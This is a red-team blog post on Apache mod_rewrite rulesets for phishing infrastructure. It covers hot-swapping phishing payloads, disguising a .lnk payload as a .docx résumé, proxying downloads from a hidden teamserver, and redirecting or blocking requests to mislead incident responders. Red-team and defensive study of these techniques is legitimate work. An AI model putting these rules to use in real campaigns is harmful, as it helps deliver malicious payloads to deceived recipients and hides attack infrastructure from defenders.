---
layout: post
title: Apache mod_rewrite Grab Bag
summary: Using Apache mod_rewrite to hot-swap payloads, obfuscate payload file extensions, block non-standard HTTP methods, and use an alternate method to redirect requests for invalid URIs.
tags: 
- mod_rewrite
- phishing
featuredimage: /assets/apache/payload-file-extension-obfuscation.gif
---

Apache mod_rewrite provides conditional redirection and obfuscation to a red teamer's infrastructure. I've previously written about mod_rewrite in [a few posts]({{site.baseurl}}/topics/mod_rewrite). In this post, I will cover a few quick tricks you can use in conjunction with techniques from my earlier posts while phishing or red teaming.

Be sure you read the [first-time setup instructions]({{site.baseurl}}/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection#first-time-apache-setup) for mod_rewrite to configure your server to work properly. 

# Payload Hot-Swapping
We've all been in a situation where, just after sending out a large phishing batch, we realize that some aspect of the payload doesn't work in the target environment. Previously, the batch would be burned. With mod_rewrite, we can create a ruleset to redirect requests for the original payload and redirect it to a new payload.

Let's say our original payload, `BonusesAndSalaries2017.hta`, didn't work and we want to replace it with `BonusesAndSalaries2017.lnk`. We could use the following htaccess ruleset:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/BonusesAndSalaries2017.hta$</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">/BonusesAndSalaries2017.lnk </span><span style="color: tomato"> [L,R=302]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://REDIRECTION-URL.com/</span><span style="color: mediumvioletred">?</span> <span style="color: tomato">[L,R=302]</span></div>

Line by line explanation:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request's URI </span> <span style="color: mediumseagreen">matches our original payload, BonusesAndSalaries2017.hta, </span><br>
<span style="color: gold">Change the request </span> <span style="color: orange">to serve /BonusesAndSalaries2017.lnk. </span><span style="color: tomato">Do not evaluate further rules and redirect the user, changing their address bar.</span><br>
If the above conditions are not met, <span style="color: gold">change the entire request</span> <span style="color: orange"> to http://REDIRECTION-URL.com/ </span><span style="color: mediumvioletred">and drop any query strings from the original request. </span> <span style="color: tomato">Do not evaluate further rules and redirect the user, changing their address bar.</span></div>

Delete the original payload and put the above ruleset in an htaccess file in the web root of the server hosting the original payload. While this technique works as a reaction a phishing issue, it also works proactively. By using a generic link (such as `/BonusesAndSalaries2017`) in the email, you can quickly modify the third line of the htaccess file to serve up your next payload.

# Payload File Extension Obfuscation
Similar to payload hot-swapping, we can use mod_rewrite to help our phishing email look more believable to targets and email security appliances by hiding our payload's true file extension. Imagine we are going to use an lnk payload, but want end-users to think they're clicking on a link to a Word document. If our email used the `<a>` tags to obfuscate the link, a mouse-over or copy and paste thwarts the plan. Not to mention the fact that display text that doesn't match the hyperlink destination raises your score in many spam filters.

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/JackBrownResume.docx?$</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">/JackBrownResume.lnk</span><span style="color: tomato"> [L,R=302]</span><br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/JackBrownResume.lnk?$</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://TEAMSERVER-IP/<span style="color: dodgerblue">JackBrownResume.lnk</span></span> <span style="color: tomato">[P]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://REDIRECTION-URL.com/</span><span style="color: mediumvioletred">?</span> <span style="color: tomato">[L,R=302]</span></div>

Line by line explanation:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request's URI </span> <span style="color: mediumseagreen">is /JackBrownResume.docx (the link we put in the phishing email body), </span><br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to /JackBrownResume.lnk (the actual payload). </span><span style="color: tomato">Do not evaluate further rules and redirect the user, changing their address bar.</span><br>
<span style="color: dodgerblue">If the request's URI </span> <span style="color: mediumseagreen">is /JackBrownResume.lnk (the payload we want to serve), </span><br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to serve </span><span style="color: dodgerblue">/JackBrownResume.lnk</span><span style="color: orange"> from the teamserver's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
If the above conditions are not met, <span style="color: gold">change the entire request</span> <span style="color: orange"> to http://REDIRECTION-URL.com/ </span><span style="color: mediumvioletred">and drop any query strings from the original request. </span> <span style="color: tomato">Do not evaluate further rules and redirect the user, changing their address bar.</span>
</div>

The mod_rewrite ruleset will redirect our docx link to the lnk and trigger a download in the end-user's browser. 

Here is a demo of this ruleset in action:

![Payload File Extension Obfuscation Demo](/assets/apache/payload-file-extension-obfuscation.gif)

# 404 Redirection

In my post [Invalid URI Redirection with Apache mod_rewrite]({{site.baseurl}}/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/), I covered a method of redirecting invalid URI requests to a chosen page. That method involves manually specifying allowed URIs, regardless of files present in the web directory on your server. 

We can accomplish a similar function by redirecting all requests for nonexistent resources (404s) to a different page:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
ErrorDocument 404 <span style="color: dodgerblue">http://REDIRECTION-URL.com/</span><br></div>
 
If you are only using your Apache server for redirection this is a quick method of filtering requests for invalid URIs. But, keep in mind that Apache will serve any valid files requested

# Block Non-Standard HTTP Methods
Just as pentesters will use non-standard HTTP methods to gather intelligence from a target server, incident responders can use these HTTP methods against our infrastructure. To reduce that risk, we can allow GET and POST requests and redirect all others with the following ruleset:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_METHOD}</span> <span style="color: mediumseagreen">!^(GET|POST)</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://REDIRECTION-URL.com</span><span style="color: tomato"> [L,R=302]</span><br></div>

Line by line explanation:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request's HTTP Method </span> <span style="color: mediumseagreen">is not GET or POST, </span><br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to http://REDIRECTION-URL.com. </span><span style="color: tomato">Do not evaluate further rules and redirect the user, changing their address bar.</span><br></div>

# Summary

Apache mod_rewrite provides a multitude of functionality that is useful for offensive security assessments. With the mod_rewrite techniques covered in this post, we can conditionally redirect web requests to obfuscate our backend infrastructure and point incident responders in the wrong direction. The techniques covered in this post can be combined with other [previously covered]({{site.baseurl}}/topics/mod_rewrite) techniques to even greater effect.

# Resources

* [mod-rewrite-cheatsheet.com](http://mod-rewrite-cheatsheet.com)
* [Official Apache 2.4 mod_rewrite Documentation](http://httpd.apache.org/docs/current/rewrite/)
	* [Apache mod_rewrite Introduction](https://httpd.apache.org/docs/2.4/en/rewrite/intro.html)
* [An In-Depth Guide to mod_rewrite for Apache](http://code.tutsplus.com/tutorials/an-in-depth-guide-to-mod_rewrite-for-apache--net-6708)